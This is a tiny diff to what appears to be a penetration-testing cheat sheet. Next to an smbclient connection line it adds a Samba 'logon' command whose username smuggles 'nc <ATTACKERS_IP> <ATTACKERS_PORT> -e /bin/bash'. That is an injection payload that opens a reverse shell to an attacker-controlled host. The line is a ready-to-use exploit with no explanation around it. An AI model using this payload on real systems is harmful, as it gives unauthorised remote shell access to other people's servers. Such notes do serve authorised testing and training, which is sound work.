@@ -39,5 +39,5 @@ cmedb - creds/hosts (show results)
 
 *SMBclient
 smbclient '\\<TARGET_IP>\<Share>'
-
+smb: \> logon "/='nc <ATTACKERS_IP> <ATTACKERS_PORT> -e /bin/bash'"
 
